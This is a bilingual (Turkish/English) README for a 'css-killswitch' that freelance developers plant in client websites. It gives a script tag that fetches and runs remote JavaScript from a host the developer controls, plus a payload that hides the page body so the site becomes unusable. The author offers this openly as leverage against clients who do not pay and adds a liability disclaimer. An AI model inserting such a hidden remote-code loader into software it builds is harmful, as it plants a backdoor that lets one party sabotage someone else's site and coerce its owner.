# css-killswitch
The holy CSS killswitch that devastates HTML body.


## Türkçe ##

Eğer benim gibi ufak-orta ölçekli projelerle uğraşıyorsanız, ve proje altyapısı sizin elinizde değilse, yani hosting&domain ikilisi size ait değilse, bu kod işinize yarayacaktır.

```sh
<script type="text/javascript">

jQuery.ajax({

type: "GET",

url: "http://seninelindekibirsite.com/killswitch/acildurum.js",

dataType: "script"

});

</script>
```

bu script tag'inin içindeki get işlemi, sizin kontrolünüz altında olan bir siteden acildurum JS dosyamızı çağırır. Peki acildurum.js'nin içinde ne var?

```sh

/*jQuery("body").css("display","none");
$( "body" ).append( "<p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p>" );*/
```

Tabi ki siteyi kullanılmaz hale getiren ufak bir kod bloğu. Ve paramızı ödemekte problem çıkartan müşteri, götüm götüm bizi kovalamaya başlıyor. Sorun çözüldü!

Not: Bu kodu kullanıp projeyi kullanılmaz hale getirmeniz ile ilgili bütün yasal sorumluluk size aittir. Eğer müşteri ile iletişim kuramıyorsanız, ödemenizi alıp projeyi sonlandırma pencereniz tamamen kapandıysa, bu kod muhtemelen iyi bir seçim olacaktır.

Eğer çalışmayı beğendiyseniz, lütfen bana bir kahve alın: http://buymeacoff.ee/ilgink

## English ##

Hey! If you dude work on small-mid range projects and don't own the domain&hosting infrastructure, that code might be the catch for you.





```sh
<script type="text/javascript">

jQuery.ajax({

type: "GET",

url: "http://seninelindekibirsite.com/killswitch/acildurum.js",

dataType: "script"

});

</script>
```

This script tag calls a script from a website you own, and let's see what we got here?

```sh

/*jQuery("body").css("display","none");
$( "body" ).append( "<p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p><p>Acil durum şalteri</p>" );*/
```

Of course, a code block to get website unaccessible. Client that refuses the pay up will get his/her *ss on fire soon, problem solved!

Note that I'm not responsible for the illegal use of that code block, all the legal responsibility on you. It's a final solution for client doesn't come up on phone calls, and the certain consequences that you get ripped off. Also note that you're gonna be the guilty side if you had a partial payment for the project.

Please buy me a coffee if you like the work here: http://buymeacoff.ee/ilgink
